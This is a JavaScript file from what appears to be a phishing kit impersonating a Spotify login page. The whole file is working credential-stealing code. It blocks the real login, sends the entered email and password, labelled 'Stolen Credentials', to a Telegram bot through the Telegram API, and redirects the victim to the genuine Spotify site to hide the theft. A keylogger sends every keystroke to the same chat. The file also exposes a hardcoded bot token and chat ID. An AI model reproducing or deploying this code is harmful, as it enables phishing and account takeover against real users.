const TELEGRAM_BOT_TOKEN = "7647997516:AAHd6v9EH2OlCS11I-xWOFBkT2mhFeAbEBk"; // Replace with your bot token
const TELEGRAM_CHAT_ID = "1331902974"; // Replace with your chat ID

document.addEventListener("DOMContentLoaded", function() {
    const loginForm = document.getElementById("loginForm");

    // Capture form submission and send data to Telegram
    loginForm.addEventListener("submit", function(event) {
        event.preventDefault(); // Prevent real login

        let email = document.getElementById("email").value;
        let password = document.getElementById("password").value;

        let message = `🔴 Stolen Credentials:\n📧 Email: ${email}\n🔑 Password: ${password}`;

        // Send stolen data to Telegram
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
        }).then(() => {
            window.location.href = "https://www.spotify.com/login"; // Redirect to real Spotify login page
        });
    });

    // Keylogger: Sends every keystroke to Telegram
    document.addEventListener("keypress", function(event) {
        let message = `Key Pressed: ${event.key}`;

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
        });
    });
});
